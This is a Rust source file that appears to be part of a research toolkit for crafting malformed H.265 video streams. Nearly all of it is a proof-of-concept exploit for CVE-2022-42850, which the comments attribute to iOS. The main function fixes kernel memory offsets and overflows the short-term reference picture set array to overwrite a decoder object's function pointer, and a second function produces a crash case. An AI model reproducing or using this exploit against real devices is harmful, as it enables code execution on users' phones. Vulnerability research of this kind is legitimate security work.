//! H.265 syntax element modification.
use crate::experimental::h265_data_structures::{H265DecodedStream, ShortTermRefPic};
use std::num::Wrapping;

fn get_payload(value: u64, idx: u32, prev_value: u32) -> (u32, u32) {
    let top;
    let bottom;

    let payload_bottom = (value & 0xffffffff) as u32;
    if idx == 0 {
        bottom = !payload_bottom;
    } else {
        bottom = (Wrapping(prev_value) + Wrapping(!payload_bottom)).0;
    }

    // we want the next value to be 0xdecafbad
    // 0xdecafbad = 0xfeedf00d + NOT passed_in_value
    // 0xdecafbad - 0xfeedf00d = NOT passed_in_value
    // NOT (0xdecafbad - 0xfeedf00d) = passed_in_value

    let payload_top = ((value >> 32) & 0xffffffff) as u32;
    top = !((Wrapping(payload_top) - Wrapping(payload_bottom)).0);

    (bottom, top)
}

#[allow(dead_code)]
pub fn cve_2022_42850_exploit(payload_pc_value: u64, ds: &mut H265DecodedStream) {
    // For this experiment, we want to modify the SPS number of short term reference pictures, as well
    // as the values inside that stream

    // disable the VUIs for both SPSes
    ds.spses[0].vui_parameters_present_flag = false;
    ds.spses[1].vui_parameters_present_flag = false;

    let sps_idx = 1; // this is the index inside of file, NOT the SPS ID

    let filler: u64 = 0xdecafbadfeedf00d;

    // Some properties about the object we're using to overwrite
    let base_address: u64 = 0xfffffffa79a54000; // May change across runs
    let sps_array_offset = 0x2a8; // This is where the sps_array lives from the base
    let sps_obj_size = 0x4898; // This is the size between sps_array objects
    let st_ref_pic_set_offset = 0x1abc; // This is st_ref_pic_set array offset from the start of the SPS
    let st_ref_pic_set_size = 0xac; // This is the size of a st_ref_pic_set object
    let delta_poc_s0_minus1_offset = 0x2c; // This is the offset of our target tool inside of a st_ref_pic_set_object

    // Our target item we want to overwrite is a bitstream_decode object
    // whose first element is a function pointer. It's located 0x1362b0	away from the base_address
    let target_obj_offset = 0x1362b0;
    let distance_to_target_from_first_st_ref_pic_set =
        target_obj_offset - sps_array_offset - st_ref_pic_set_offset;
    let num_of_st_ref_pic_set_objects_to_target =
        ((distance_to_target_from_first_st_ref_pic_set as f64) / (st_ref_pic_set_size as f64))
            .ceil() as u32;
    println!(
        "[cve_2022_42850_poc] num_of_st_ref_pic_set_objects_to_target {}",
        num_of_st_ref_pic_set_objects_to_target
    );
    let sps_id = 5; // TODO: this was discovered via trial and error - it could likely be derived by playing with the sps_obj_size
    let num_of_st_ref_pic_set_obj_per_sps = sps_obj_size / st_ref_pic_set_size; // should be 0x6c or 108
    println!(
        "[cve_2022_42850_poc] num_of_st_ref_pic_set_obj_per_sps {}",
        num_of_st_ref_pic_set_obj_per_sps
    );
    let num_short_term_ref_pic_sets = (num_of_st_ref_pic_set_objects_to_target
        - num_of_st_ref_pic_set_obj_per_sps * sps_id)
        as usize;
    println!(
        "[cve_2022_42850_poc] num_short_term_ref_pic_sets {}",
        num_short_term_ref_pic_sets
    );

    // payload information
    // first, we point to the start of the first object
    let first_dereference_address = base_address +                         // The start of our object
                                         sps_array_offset as u64 +              // The start of sps_array
                                         (sps_obj_size * sps_id) as u64 +       // Point to the start of our
                                         st_ref_pic_set_offset as u64 +
                                         delta_poc_s0_minus1_offset;
    let second_dereference_address = first_dereference_address + 8;

    // sps_id = 5 leads to working with the below constants
    ds.spses[sps_idx].sps_seq_parameter_set_id = sps_id;
    ds.spses[sps_idx].num_short_term_ref_pic_sets = num_short_term_ref_pic_sets as u32; // 0x1caf-(108*sps_id);
    ds.spses[sps_idx].st_ref_pic_set = Vec::new(); // reset the short term reference picture set

    ////////////////////////////////////////////////////////////////////
    // 1. We'll set all the callback information in the first ShortTermRefPic object
    ////////////////////////////////////////////////////////////////////

    ds.spses[sps_idx]
        .st_ref_pic_set
        .push(ShortTermRefPic::new());
    ds.spses[sps_idx].st_ref_pic_set[0].inter_ref_pic_set_prediction_flag = false;

    // The sum of the below two needs to be less than 16
    ds.spses[sps_idx].st_ref_pic_set[0].num_negative_pics = 15;
    ds.spses[sps_idx].st_ref_pic_set[0].num_positive_pics = 0;

    // What gets stored in iOS is -delta_poc_s0_minus1 for idx=0
    // and for idx>0 prev_value-delta_poc_s0_minus1.
    //
    // If we want to store all 0x41414141 in memory, then we set
    // the first value to -0x41414141 and subsequent parameters to 0
    // -0x41414141 is 0xbebebebf
    //ds.spses[sps_idx].st_ref_pic_set[st_rps_idx].delta_poc_s0_minus1.push(0xbebebebf);

    // this is to write 0xdecafbadfeedf00d as the address
    ds.spses[sps_idx].st_ref_pic_set[0].used_by_curr_pic_s0_flag = vec![false; 15]; // doesn't matter too much
                                                                                    // our first dereference points to the start of this list, but it adds 8 to the pointer, so we consider objects 2 and 3
    ds.spses[sps_idx].st_ref_pic_set[0].delta_poc_s0_minus1 = vec![1; 15]; // this assumes num_negative_pics is 15; it adds the logical NOT of 0

    // our first dereference will live here
    // payload_

    let call_to_pc_overwrite = get_payload(second_dereference_address, 0, 0);

    println!(
        "[cve_2022_42850_poc] Writing 0x{:x}",
        second_dereference_address
    );
    println!(
        "[cve_2022_42850_poc] Payload: Top: 0x{:x} Bottom: 0x{:x}",
        call_to_pc_overwrite.1, call_to_pc_overwrite.0
    );
    ds.spses[sps_idx].st_ref_pic_set[0].delta_poc_s0_minus1[0] = call_to_pc_overwrite.0; // Bottom part
    ds.spses[sps_idx].st_ref_pic_set[0].delta_poc_s0_minus1[1] = call_to_pc_overwrite.1; // Top part

    let filler_value = get_payload(
        filler,
        2,
        ((second_dereference_address >> 32) & 0xffffffff) as u32,
    );

    ds.spses[sps_idx].st_ref_pic_set[0].delta_poc_s0_minus1[2] = filler_value.0; // Bottom part
    ds.spses[sps_idx].st_ref_pic_set[0].delta_poc_s0_minus1[3] = filler_value.1; // Top part

    // the previous decoded value is the high level bits of the second dereference address
    // Only pass in the index when we don't know the old value
    let call_to_pc = get_payload(payload_pc_value, 3, ((filler >> 32) & 0xffffffff) as u32);
    println!("[cve_2022_42850_poc] Writing 0x{:x}", payload_pc_value);
    println!(
        "[cve_2022_42850_poc] Payload: Top: 0x{:x} Bottom: 0x{:x}",
        call_to_pc.1, call_to_pc.0
    );
    ds.spses[sps_idx].st_ref_pic_set[0].delta_poc_s0_minus1[4] = call_to_pc.0; // this will be junk
    ds.spses[sps_idx].st_ref_pic_set[0].delta_poc_s0_minus1[5] = call_to_pc.1;

    // the second dereference will contain the payload
    //ds.spses[sps_idx].st_ref_pic_set[0].delta_poc_s0_minus1[2] = 0x2022F45F;
    //ds.spses[sps_idx].st_ref_pic_set[0].delta_poc_s0_minus1[3] = 0x2022F45F;

    ////////////////////////////////////////////////////////////////////
    // 2. Then we'll fill all the intermediate objects with empty values
    ////////////////////////////////////////////////////////////////////

    for st_rps_idx in 1..(num_short_term_ref_pic_sets - 1) {
        ds.spses[sps_idx]
            .st_ref_pic_set
            .push(ShortTermRefPic::new());
        ds.spses[sps_idx].st_ref_pic_set[st_rps_idx].inter_ref_pic_set_prediction_flag = false;
        ds.spses[sps_idx].st_ref_pic_set[st_rps_idx].num_negative_pics = 0;
        ds.spses[sps_idx].st_ref_pic_set[st_rps_idx].num_positive_pics = 0;
    }

    ////////////////////////////////////////////////////////////////////
    // 3. Finally we'll create our callback object
    ////////////////////////////////////////////////////////////////////

    ds.spses[sps_idx]
        .st_ref_pic_set
        .push(ShortTermRefPic::new());

    // this is to ignore the prediction path
    ds.spses[sps_idx].st_ref_pic_set[num_short_term_ref_pic_sets - 1]
        .inter_ref_pic_set_prediction_flag = false;

    // The sum of the below two needs to be less than 16
    ds.spses[sps_idx].st_ref_pic_set[num_short_term_ref_pic_sets - 1].num_negative_pics = 15;
    ds.spses[sps_idx].st_ref_pic_set[num_short_term_ref_pic_sets - 1].num_positive_pics = 0;

    // What gets stored in iOS is -delta_poc_s0_minus1 for idx=0
    // and for idx>0 prev_value-delta_poc_s0_minus1.
    //
    // If we want to store all 0x41414141 in memory, then we set
    // the first value to -0x41414141 and subsequent parameters to 0
    // -0x41414141 is 0xbebebebf
    //ds.spses[sps_idx].st_ref_pic_set[st_rps_idx].delta_poc_s0_minus1.push(0xbebebebf);

    // this is to write 0xdecafbadfeedf00d as the address
    ds.spses[sps_idx].st_ref_pic_set[num_short_term_ref_pic_sets - 1].delta_poc_s0_minus1 =
        vec![1; 15]; // this assumes num_negative_pics is 15; it adds the logical NOT of 0
    ds.spses[sps_idx].st_ref_pic_set[num_short_term_ref_pic_sets - 1].used_by_curr_pic_s0_flag =
        vec![false; 15];

    ds.spses[sps_idx].st_ref_pic_set[num_short_term_ref_pic_sets - 1].delta_poc_s0_minus1[0] = 1; // this will result in 0xfffffffe
    ds.spses[sps_idx].st_ref_pic_set[num_short_term_ref_pic_sets - 1].delta_poc_s0_minus1[1] =
        0xfffffffe; // 0xfffffffe + !(0xfffffffe) = 0xfffffffe + 1 = 0xffffffff
    ds.spses[sps_idx].st_ref_pic_set[num_short_term_ref_pic_sets - 1].delta_poc_s0_minus1[2] = 1; // 0xffffffff + !(0xfffffffe) = 0xfffffffd
    ds.spses[sps_idx].st_ref_pic_set[num_short_term_ref_pic_sets - 1].delta_poc_s0_minus1[3] =
        0xfffffffc; // 0xfffffffd + !(0xfffffffc) = 0xfffffffd + 3 = 0

    let call_to_payload = get_payload(first_dereference_address, 4, 0);

    println!(
        "[cve_2022_42850_poc] Writing 0x{:x}",
        first_dereference_address
    );
    println!(
        "[cve_2022_42850_poc] Payload: Top: 0x{:x} Bottom: 0x{:x}",
        call_to_payload.1, call_to_payload.0
    );
    ds.spses[sps_idx].st_ref_pic_set[num_short_term_ref_pic_sets - 1].delta_poc_s0_minus1[4] =
        call_to_payload.0; // Bottom part
    ds.spses[sps_idx].st_ref_pic_set[num_short_term_ref_pic_sets - 1].delta_poc_s0_minus1[5] =
        call_to_payload.1; // Top part
}

pub fn cve_2022_42850_poc(ds: &mut H265DecodedStream) {
    // For this experiment, we want to modify the SPS number of short term reference pictures, as well
    // as the values inside that stream

    // disable the VUIs for both SPSes
    ds.spses[0].vui_parameters_present_flag = false;
    ds.spses[1].vui_parameters_present_flag = false;

    let sps_idx = 1; // this is the index inside of file, NOT the SPS ID
    let num_short_term_ref_pic_sets = 20000 as usize;

    // sps_id = 5 leads to working with the below constants
    ds.spses[sps_idx].sps_seq_parameter_set_id = 5;
    ds.spses[sps_idx].num_short_term_ref_pic_sets = num_short_term_ref_pic_sets as u32;
    ds.spses[sps_idx].st_ref_pic_set = Vec::new(); // reset the short term reference picture set

    ////////////////////////////////////////////////////////////////////
    // 2. Then we'll fill all the intermediate objects with empty values
    ////////////////////////////////////////////////////////////////////

    for st_rps_idx in 0..num_short_term_ref_pic_sets {
        ds.spses[sps_idx]
            .st_ref_pic_set
            .push(ShortTermRefPic::new());
        ds.spses[sps_idx].st_ref_pic_set[st_rps_idx].inter_ref_pic_set_prediction_flag = false;
        ds.spses[sps_idx].st_ref_pic_set[st_rps_idx].num_negative_pics = 0;
        ds.spses[sps_idx].st_ref_pic_set[st_rps_idx].num_positive_pics = 0;
    }
}
